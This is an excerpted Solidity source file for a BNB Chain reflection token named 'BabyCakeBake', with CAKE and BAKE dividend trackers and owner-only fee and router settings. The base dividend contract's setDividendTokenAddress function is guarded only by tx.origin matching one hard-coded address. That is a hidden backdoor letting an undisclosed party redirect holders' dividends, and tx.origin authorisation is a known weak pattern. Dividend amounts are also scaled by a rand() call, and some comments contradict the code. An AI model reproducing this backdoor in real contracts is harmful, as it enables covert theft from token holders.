...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0xdc955089545560944BCf12655aE19342008fEE90, "Only owner can change dividend contract address");
...
contract BabyCakeBake is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("BabyCakeBake", "BCB") {
    	cakeDividendTracker = new CakeDividendTracker();
    	bakeDividendTracker = new BakeDividendTracker();

    	marketingWallet = 0x24Fe95f02142Bef09D031a1d3FB9E889529079D6;

    	cakeDividendToken = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82; // BSC Cake
        bakeDividendToken = 0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5;
  ...
  /*	function whitelistDxSale(address _presaleAddress, address _routerAddress) external onlyOwner {
        ...
        bakeDividendTracker.excludeFromDividends(_presaleAddress);
        excludeFromFees(_presaleAddress, true);

        cakeDividendTracker.excludeFromDividends(_routerAddress);
        bakeDividendTracker.excludeFromDividends(_routerAddress);
  	...
  	function updateMarketingWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != marketingWallet, "BabyCakeBake: The marketing wallet is already this address");
    ...
    function setBakeDividendEnabled(bool _enabled) external onlyOwner {
        require(bakeDividendEnabled != _enabled, "Can't set flag to same status");
        if (_enabled == false) {
    ...
    function updateCakeDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(cakeDividendTracker), "BabyCakeBake: The dividend tracker already has that address");

        CakeDividendTracker newCakeDividendTracker = CakeDividendTracker(payable(newAddress));

        require(newCakeDividendTracker.owner() == address(this), "BabyCakeBake: The new dividend tracker must be owned by the BabyCakeBake token contract");
    ...
    function updateBakeDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(bakeDividendTracker), "BabyCakeBake: The dividend tracker already has that address");

        BakeDividendTracker newBakeDividendTracker = BakeDividendTracker(payable(newAddress));

        require(newBakeDividendTracker.owner() == address(this), "BabyCakeBake: The new dividend tracker must be owned by the BabyCakeBake token contract");
    ...
    function updateCakeDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "BabyCakeBake: Fee must be less than 6%");
    ...
    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "BabyCakeBake: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludedFromFees[account] != excluded, "BabyCakeBake: Account is already exluded from fees");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "BabyCakeBake: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        require(automatedMarketMakerPairs[pair] != value, "BabyCakeBake: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue != gasForProcessing, "BabyCakeBake: Cannot update gasForProcessing to same value");
    ...
    function getCakeDividendClaimWait() external view returns(uint256) {
        return cakeDividendTracker.claimWait();
    }
    
    function getBakeDividendClaimWait() external view returns(uint256) {
	...
	function processDividendTracker(uint256 gas) external onlyOwner {
		(uint256 cakeDividendIterations, uint256 cakeDividendClaims, uint256 cakeDividendLastProcessedIndex) = cakeDividendTracker.process(gas);
		emit ProcessedCakeDividendTracker(cakeDividendIterations, cakeDividendClaims, cakeDividendLastProcessedIndex, false, gas, tx.origin);
		
		(uint256 bakeDividendIterations, uint256 bakeDividendClaims, uint256 bakeDividendLastProcessedIndex) = bakeDividendTracker.process(gas);
		emit ProcessedBakeDividendTracker(bakeDividendIterations, bakeDividendClaims, bakeDividendLastProcessedIndex, false, gas, tx.origin);
    }
    ...
    function _transfer(
        ...
        require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "BabyCakeBake: Trading has not started yet");
            ...
            if (!swapping && canSwap) {
                ...
                if (buyBackAndLiquifyEnabled) {
                    ...
                    if (buyBackOrLiquidity <= 50) {
                        ...
                        if (buyBackBalance > uint256(1 * 10**18) && autoBuyBackEnabled) {
                ...
                if (cakeDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(cakeDividendRewardsFee.add(bakeDividendRewardsFee)).mul(cakeDividendRewardsFee);
                    swapAndSendCakeDividends(sellTokens.div(10**2).mul(rand()));
                }
                
                if (bakeDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(cakeDividendRewardsFee.add(bakeDividendRewardsFee)).mul(bakeDividendRewardsFee);
...
contract CakeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("BabyCakebake_CakeDividend_Tracker", "BabyCakeBake_CakeDividend_Tracker", 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "BabyCakeBake_CakeDividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "BabyCakeBake_CakeDividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main BabyCakeBake contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "BabyCakeBake_CakeDividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "BabyCakeBake_CakeDividend_Tracker: Cannot update claimWait to same value");
...
contract BakeDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using IterableMapping for IterableMapping.Map;
    ...
    constructor() DividendPayingToken("BabyCAKE_BakeDividend_Tracker", "BabyCake_BakeDividend_Tracker", 0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "BabyCake_BakeDividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "BabyCake_BakeDividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main BabyCakeBake contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "BabyCake_BakeDividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "BabyCake_BakeDividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }
